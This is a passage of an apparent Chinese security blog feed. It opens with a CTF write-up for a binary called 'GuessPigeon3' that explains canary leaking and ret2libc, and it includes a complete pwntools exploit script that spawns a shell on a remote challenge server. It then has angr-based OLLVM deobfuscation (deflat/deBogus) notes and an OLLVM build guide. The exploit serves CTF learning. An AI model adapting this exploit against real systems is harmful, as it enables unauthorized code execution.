id="canary">canary</h4><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/mitigation/canary-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/mitigation/canary-zh/</a></p><p><strong>canary</strong>是一种防止栈溢出的方式，通过在执行函数之前生成一个随机的canary，可以防止在函数结束之前有人通过read, scanf等不安全的函数进行栈溢出攻击，程序结束时会<strong>stack_check_fail</strong>，一旦canary被改变，程序将会马上退出</p><p><strong>canary</strong>的特点是最低位为0, eg: 0x49d8c100 ，本意是将printf截断，我们在用padding填充的时候可以sendline，即在最后一位填上一个’\n’，就可以做到将canary输出，当然最后要记得canary = out - ‘a’</p><h4 id="libc">libc</h4><p>程序中没有给出system函数和/bin/sh字符串</p><p>但是给了一个libc文件，libc文件是一个动态链接库，程序通过读取这个动态链接库来执行它想要的函数</p><p>当然这个动态链接库的地址就<strong>不是固定的了</strong>，虽然我们静态分析的时候会得到一个<strong>静态的地址</strong>，但这个并不是动态链接库的最终地址，我们需要将程序运行之后某个libc函数的地址泄露出来，算出它与libc中的静态地址的偏移，从而得到libc中每个函数的真实地址</p><h4 id="plt-got">plt got</h4><p><a href="https://ctf-wiki.github.io/ctf-wiki/executable/elf/elf-structure-zh/#global-offset-table" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/executable/elf/elf-structure-zh/#global-offset-table</a></p><p>plt的本质上是一个指向got表的指针，系统调用函数的时候会首先jmp plt，由plt进行push ，再jmp的操作，最终读取到got表，将eip指向函数的真实地址。</p><p>这个生成got表的动作是<strong>动态</strong>的，所以在我们没有调用某个函数时这个函数的got表将<strong>不存有任何地址信息</strong>。我们想要得到某个libc函数的真实地址，最好的方法是找准一个已经被系统执行的函数，查询它的got表，从而得到这个函数的真实地址。</p><p>这道题中puts和read函数都是被程序执行过的，我们随意选取一个函数</p><p>用  <strong>elf.got[‘puts’]</strong> 调出got表地址，利用write**（三个参数）<strong>或者puts</strong>（一个参数）**函数将其输出</p><p>相当于把guess函数的返回地址设置为write/puts</p><blockquote><p>注意，这里调用write/puts函数的本质也是调用plt表，在汇编层面其实等价于jmp addr</p><p>而这些函数都是需要ret/ leave 的，所以相应的我们应当在 write_plt 后面<strong>先加入一个 ret_addr</strong> ，再push 参数</p></blockquote><h4 id="after-that">after that</h4><p>同样的，注意canary 和 write_plt之间也有12个字节的padding，我第一次做这题的时候也是在padding上面卡了很久，一定要用gdb仔细调试才能得出padding长度！！</p><p>ret_addr可以设置为guess，因为guess函数有两个溢出点，可以继续栈溢出</p><p>在我们得到read的真实地址之后，我们就可以通过</p><p><strong>read_addr - libc.symbols[‘read’]</strong></p><p>来得出偏移offset了，现在我们就可以知道任何一个函数的真实地址了</p><p>再执行一遍guess，同样的要获取canary并且构造payload。</p><p>最后压入/bin/sh参数，执行system()</p><h4 id="little-trick">little trick</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pwnlib</span><br><span class="line">pwnlib.gdb.attach(process)</span><br></pre></td></tr></table></figure><p>可以对pwntools的过程进行调试</p><h3 id="exp-py-3"><a href="http://exp.py" target="_blank" rel="noopener">exp.py</a></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pwnlib</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process('./GuessPigeon3')</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'132.232.34.26'</span>,<span class="number">8888</span>)</span><br><span class="line">p.recvuntil(<span class="string">'token:'</span>)</span><br><span class="line">p.sendline(<span class="string">'GuessPigeon3'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./GuessPigeon3'</span>)</span><br><span class="line">libc = ELF(<span class="string">'libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ret_addr = elf.symbols[<span class="string">'guess'</span>]</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">'write'</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">'a'</span> *<span class="number">100</span></span><br><span class="line">p.recvuntil(<span class="string">'Please input your guess:'</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(payload1)</span><br><span class="line">canary = u32(p.recv(<span class="number">4</span>)) - <span class="number">0xa</span> <span class="comment">#get canary value</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"canary = "</span> + str(hex(canary))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">'b'</span>*<span class="number">100</span> + p32(canary) + <span class="string">'b'</span>* <span class="number">12</span></span><br><span class="line">payload2 += p32(puts_plt) + p32(ret_addr) + p32(write_got)  </span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"your guess again:"</span>)</span><br><span class="line">p.send(payload2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Good bye~\n'</span>)</span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc_read_addr = "</span> + hex(write_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># return to guess()</span></span><br><span class="line"></span><br><span class="line">payload3 = <span class="string">'c'</span> * <span class="number">100</span></span><br><span class="line">p.recvuntil(<span class="string">'Please input your guess:'</span>)</span><br><span class="line">p.sendline(payload3)</span><br><span class="line">p.recvuntil(payload3)</span><br><span class="line">canary = u32(p.recv(<span class="number">4</span>)) - <span class="number">0xa</span> <span class="comment">#another canary</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"canary' = "</span> + str(hex(canary))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_write = libc.symbols[<span class="string">'write'</span>]</span><br><span class="line">libc_system = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">libc_binsh = libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line">offset = write_addr - libc_write <span class="comment">#offset between real_addr and libc_addr</span></span><br><span class="line">system_addr = offset + libc_system</span><br><span class="line">binsh_addr = offset + libc_binsh</span><br><span class="line"></span><br><span class="line">payload4 = <span class="string">'d'</span>*<span class="number">100</span> + p32(canary)</span><br><span class="line">payload4 += <span class="string">'b'</span>*<span class="number">12</span></span><br><span class="line">payload4 += p32(system_addr) + p32(ret_addr) + p32(binsh_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'again:'</span>)</span><br><span class="line">p.sendline(payload4)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="write up" scheme="https://mrh1s.top/categories/write-up/"/>
    
      <category term="cnss_recruit_201809" scheme="https://mrh1s.top/categories/write-up/cnss-recruit-201809/"/>
    
    
      <category term="pwn_stack_overflow" scheme="https://mrh1s.top/tags/pwn-stack-overflow/"/>
    
      <category term="pwn_canary" scheme="https://mrh1s.top/tags/pwn-canary/"/>
    
  </entry>
  
  <entry>
    <title>deflat</title>
    <link href="https://mrh1s.top/posts/77b618a/"/>
    <id>https://mrh1s.top/posts/77b618a/</id>
    <published>2019-09-08T15:22:00.000Z</published>
    <updated>2019-09-08T15:55:32.625Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1>deflat</h1><h2 id="introduction">introduction</h2><p>前面谈到了利用<strong>ollvm</strong>可以对控制流进行混淆、平坦化，有正向必有逆向，有人利用angr模块写出了一个将混乱的控制流进行恢复，转化为可读的正常程序的脚本</p><h2 id="setup">setup</h2><h3 id="angr">angr</h3><p>angr是一个python模块，需要通过pip安装，然而安装时有可能会破坏原有其他模块的环境，所以angr官方文档提出应当使用虚拟python环境来安装angr。</p><p>亲测直接pip install anagr是不起作用的</p><p>官方文档可参考：<a href="https://docs.angr.io/introductory-errata/install" target="_blank" rel="noopener">https://docs.angr.io/introductory-errata/install</a></p><p><strong>安装步骤</strong></p><p>安装virtualenvwrapper</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install python3-dev libffi-dev build-essential virtualenvwrapper</span><br></pre></td></tr></table></figure><p>构建虚拟环境</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkvirtualenv --python=$(<span class="built_in">which</span> python3) angr &amp;&amp; pip install angr</span><br></pre></td></tr></table></figure><p>如果系统提示mkvirtualenv : command not found， 参考如下这篇文章进行修复</p><p><a href="https://blog.csdn.net/qq_44090577/article/details/90756207" target="_blank" rel="noopener">https://blog.csdn.net/qq_44090577/article/details/90756207</a></p><p>安装好之后，就可以开始正常运行脚本了</p><h3 id="deflat-py"><a href="http://deflat.py" target="_blank" rel="noopener">deflat.py</a></h3><p>clone deflat的相关脚本</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/mrh929/deflat</span><br></pre></td></tr></table></figure><h2 id="usage">usage</h2><h3 id="deflat">deflat</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 deflat.py [file_name] [start_addr]</span><br></pre></td></tr></table></figure><blockquote><p><code>0x400660 是函数</code>main()`的地址。</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">(angr) root@ubuntu:~/Desktop/deflat/test# python3 deflat.py esay_obfuscation 0x400660</span><br><span class="line">*******************relevant blocks************************</span><br><span class="line">prologue: 0x400660</span><br><span class="line">main_dispatcher: 0x40072a</span><br><span class="line">pre_dispatcher: 0x400926</span><br><span class="line">retn: 0x40091a</span><br><span class="line">relevant_blocks: ['0x4008a3', '0x4008b8', '0x400855', '0x40083d', '0x400868', '0x400909', '0x400820', '0x4008f8', '0x400881', '0x400816']</span><br><span class="line">*******************symbolic execution*********************</span><br><span class="line">-------------------dse 0x4008a3---------------------</span><br><span class="line">-------------------dse 0x4008b8---------------------</span><br><span class="line">CRITICAL | 2019-09-08 08:46:50,813 | angr.sim_state | The name state.se is deprecated; please use state.solver.</span><br><span class="line">-------------------dse 0x400855---------------------</span><br><span class="line">-------------------dse 0x40083d---------------------</span><br><span class="line">-------------------dse 0x400868---------------------</span><br><span class="line">-------------------dse 0x400909---------------------</span><br><span class="line">-------------------dse 0x400820---------------------</span><br><span class="line">-------------------dse 0x4008f8---------------------</span><br><span class="line">-------------------dse 0x400881---------------------</span><br><span class="line">-------------------dse 0x400816---------------------</span><br><span class="line">-------------------dse 0x400660---------------------</span><br><span class="line">************************flow******************************</span><br><span class="line">0x4008a3:  ['0x400868']</span><br><span class="line">0x4008b8:  ['0x4008f8', '0x400909']</span><br><span class="line">0x400855:  ['0x400868']</span><br><span class="line">0x40083d:  ['0x40091a']</span><br><span class="line">0x400868:  ['0x400881', '0x4008b8']</span><br><span class="line">0x400909:  ['0x40091a']</span><br><span class="line">0x400820:  ['0x40083d', '0x400855']</span><br><span class="line">0x4008f8:  ['0x40091a']</span><br><span class="line">0x400881:  ['0x4008a3']</span><br><span class="line">0x400816:  ['0x4008a3']</span><br><span class="line">0x400660:  ['0x400820']</span><br><span class="line">0x40091a:  []</span><br><span class="line">************************patch*****************************</span><br><span class="line">Successful! The recovered file: esay_obfuscation_recovered</span><br></pre></td></tr></table></figure><p><strong>原二进制文件（no flat）</strong></p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://i.loli.net/2019/09/08/kFiOs7ApN4U92wx.png" alt="image.png"></p><p><strong>deflat 后的二进制文件</strong></p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://i.loli.net/2019/09/08/hfv3K75Jpl1YtmX.png" alt="image.png"></p><blockquote><p>两者几乎相同</p></blockquote><h3 id="deBogus">deBogus</h3><h4 id="Description">Description</h4><p>利用<a href="https://github.com/angr/angr" target="_blank" rel="noopener">angr</a>框架去除虚假的控制流，详细内容请参考<a href="https://blog.quarkslab.com/deobfuscation-recovering-an-ollvm-protected-program.html" target="_blank" rel="noopener">Deobfuscation: recovering an OLLVM-protected program</a> 。</p><p>原文的主要思路是在进行符号执行时，对约束条件进行&quot;精简&quot;，通过将<code>x * (x + 1) % 2 </code>替换为<code>0</code>，使得<code>(y &lt; 10 || x * (x + 1) % 2 == 0)</code>恒成立，从而获取正确的基本块，避免死循环。</p><p>在使用<a href="https://github.com/angr/angr" target="_blank" rel="noopener">angr</a>框架解决该问题时，也可以按照上述思路进行。另外一种思路是直接将<code>x</code>或<code>y</code>的值设为<code>0</code>，同样可以使得上面的约束恒成立。在默认条件下，<code>x</code>和<code>y</code>的值会被初始化为0，无需手动进行设置。也就是说，可以直接利用符号执行来解决，而不会遇到死循环的问题。</p><p>通过符号执行，获取所有执行过的基本块之后，再进行<code>patch</code>去除冗余的基本块即可。</p><blockquote><p>对控制流进行精简后，通过<code>F5</code>查看伪代码，与源码基本一致。另外，可以在此基础上对控制流进行进一步精简，比如去除冗余的指令等。</p></blockquote><h3 id="Usage">Usage</h3><blockquote><p><code>0x080483e0 </code>是函数<code>target_function()</code>的地址。</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">(angr-dev) &lt;path&gt;/deflat/bogus_control_flow$ python3 debogus.py ./target_bogus 0x80483e0</span><br><span class="line">*******************symbolic execution*********************</span><br><span class="line">executed blocks:  ['0x8048686', '0x804868b', '0x8048991', '0x8048592', '0x8048914', '0x8048715', '0x8048897', '0x8048720', '0x8048725', '0x80484ab', '0x804862c', '0x804842e', '0x80484b6', '0x80484bb', '0x80487bb', '0x80487c0', '0x80486c7', '0x8048950', '0x8048551', '0x80488d3', '0x8048955', '0x8048556', '0x8048856', '0x80489d8', '0x80488d8', '0x804885b', '0x80483e0', '0x80485e0', '0x8048761', '0x80485eb', '0x80485f0', '0x80484f7', '0x80487fc']</span><br><span class="line">************************patch******************************</span><br><span class="line">Successful! The recovered file: ./target_bogus_recovered</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="Tips" scheme="https://mrh1s.top/categories/Tips/"/>
    
    
      <category term="obfuscation" scheme="https://mrh1s.top/tags/obfuscation/"/>
    
  </entry>
  
  <entry>
    <title>ollvm_setup</title>
    <link href="https://mrh1s.top/posts/479eeb61/"/>
    <id>https://mrh1s.top/posts/479eeb61/</id>
    <published>2019-09-03T05:12:11.000Z</published>
    <updated>2019-09-08T15:21:42.988Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1>OLLVM环境搭建（转）</h1><p>版权声明：本文为CSDN博主「何胥」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/weixin_38244174/article/details/82889725" target="_blank" rel="noopener">https://blog.csdn.net/weixin_38244174/article/details/82889725</a></p><p>目前市面上的许多安全公司都会在保护IOS应用程序或安卓APP时都会用到OLLVM技术。譬如说顶象IOS加固、网易IOS加固等等。故而我们今天研究下OLLVM是个什么。将从（1）OLLVM是什么？OLLVM与LLVM的关系；（2）OLLVM的三大功能；（3）OLLVM的配置过程；（4）OLLVM源码分析。（4）OLLVM使用四个方面进行说明。</p><h3 id="（一）OLLVM是什么？">（一）OLLVM是什么？</h3><p>OLLVM是一款是由瑞士西北科技大学开发的一套开源的针对LLVM的代码混淆工具，旨在加强逆向的难度，整个项目包含数个包含独立功能的LLVM Pass，每个Pass会对应实现一种特定的混淆方式，这些Pass将在后面进行细说，通过这些Pass可以改变源程序的CFG和源程序的结构。后期转向商业项目strong.protect。Github目前已支持OLLVM-4.0.<br>与此同时，LLVM与OLLVM最大的区别在于混淆Pass的不同。混淆Pass作用于LLVM的IR中间语言，通过Pass混淆IR，最后后端依据IR生成的目标语言也会得到相应的混淆。得益于LLVM的三段式结构，即前端对代码进行语法分析词法分析形成AST并转换为中间IR语言，一系列优化Pass对IR中间语言进行优化操作，或混淆，或分析，或改变IR的操作码等等。最终在后端解释为相应平台嘚瑟机器码。OLLVM支持LLVM所支持的所有前端语言：C,C++,Objective-C,Fortran等等和LLVM所支持的所有目标平台：x86,x86-64,PowerPC,PowerPC-64, ARM, Thumb, SPARC, Alpha, CellSPU, MIPS, MSP430, SystemZ, 和 XCore。</p><h3 id="（二）OLLVM的三大功能">（二）OLLVM的三大功能</h3><p>OLLVM有三大功能，分别是：<strong>Instructions Substitution（指令替换）</strong>、<strong>Bogus Control Flow（混淆控制流）</strong>、<strong>Control Flow Flattening（控制流平展）</strong>。</p><p>Github上也有OLLVM每个功能详细的介绍和举例：<a href="https://github.com/obfuscator-llvm/obfuscator/wiki/Features%E3%80%82%E6%93%8D%E4%BD%9C%E6%8C%87%E4%BB%A4%E5%8F%AF%E4%BB%A5%E6%98%AF%E4%B8%80%E4%B8%AA%E6%88%96%E5%A4%9A%E4%B8%AA%E5%8F%82%E6%95%B0%E3%80%82" target="_blank" rel="noopener">https://github.com/obfuscator-llvm/obfuscator/wiki/Features。操作指令可以是一个或多个参数。</a></p><p>（1）指令替换功能：随机选择一种功能上等效但更复杂的指令序列替换标准二元运算符；适用范围：加法操作、减法操作、布尔操作（与或非操作）且只能为整数类型。</p><p>（2）混淆控制流功能：1.在当前基本块之前添加基本块来修改函数调用图。2.原始基本块也被克隆并填充随机选择的垃圾指令。</p><p>（3）控制流平展功能：目的是完全展平程序的控制流程图。我自己的理解是if…else变为switch…case…语句。</p><h3 id="（三）OLLVM环境搭建：">（三）OLLVM环境搭建：</h3><p>​OLLVM版本号：OLLVM 4.0；Ubuntu环境：Ubuntu16.04；虚拟机中处理器数量为4个、运行内存3G，分配硬盘空间50g。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> -b llvm-4.0 https://github.com/obfuscator-llvm/obfuscator.git </span><br><span class="line">mkdir build </span><br><span class="line"><span class="built_in">cd</span> build </span><br><span class="line">cmake -DCMAKE_BUILD_TYPE=Release ../obfuscator/ </span><br><span class="line">make -j7 <span class="comment">#多线程，如果make出现问题，可去掉-j7使用单线程编译</span></span><br></pre></td></tr></table></figure><p>​若是git clone一直失败，下不下来，尝试：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config --global http.postBuffer 20000000</span><br></pre></td></tr></table></figure><p>​若是cmake时一直报错，则将cmake那句替换为：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cmake -DCMAKE_BUILD_TYPE=Release -DLLVM_INCLUDE_TESTS=OFF ../obfuscator/</span><br></pre></td></tr></table></figure><p>​若是make时时间太长，则重新cmake后，多分配一些内存和处理器。</p><h3 id="（四）OLLVM保护命令">（四）OLLVM保护命令</h3><p><strong>指令替换功能：</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="string">'/home/mrh929/Desktop/ollvm/build/bin/clang'</span> -emit-llvm test.c -mllvm -sub -S -o testsub.ll</span><br><span class="line"> </span><br><span class="line"><span class="string">'/home/mrh929/Desktop/ollvm/build/bin/clang'</span> test.c -mllvm -sub -o <span class="built_in">test</span></span><br></pre></td></tr></table></figure><p><strong>控制流平坦化功能 ：</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="string">'/home/mrh929/Desktop/ollvm/build/bin/clang'</span> -emit-llvm test.c -mllvm -fla -S -o testfla.ll</span><br><span class="line"> </span><br><span class="line"><span class="string">'/home/mrh929/Desktop/ollvm/build/bin/clang'</span> test.c -mllvm -fla -o <span class="built_in">test</span></span><br></pre></td></tr></table></figure><p><strong>混淆控制流功能 ：</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="string">'/home/mrh929/Desktop/ollvm/build/bin/clang'</span> -emit-llvm test.c -mllvm -bcf -S -o testfla.ll</span><br><span class="line"> </span><br><span class="line"><span class="string">'/home/mrh929/Desktop/ollvm/build/bin/clang'</span> test.c -mllvm -bcf -o <span class="built_in">test</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="Tips" scheme="https://mrh1s.top/categories/Tips/"/>
    
    
      <category term="VM" scheme="https://mrh1s.top/tags/VM/"/>
    
  </entry>
  
  <entry>
    <title>nisc-flat</title>
    <link href="https://mrh1s.top/posts/a3b3dca7/"/>
    <id>https://mrh1s.top/posts/a3b3dca7/</id>
    <published>2019-08-18T10:44:38.000Z</published>
    <updated>2019-08-18T10:49:29.129Z</updated>
    
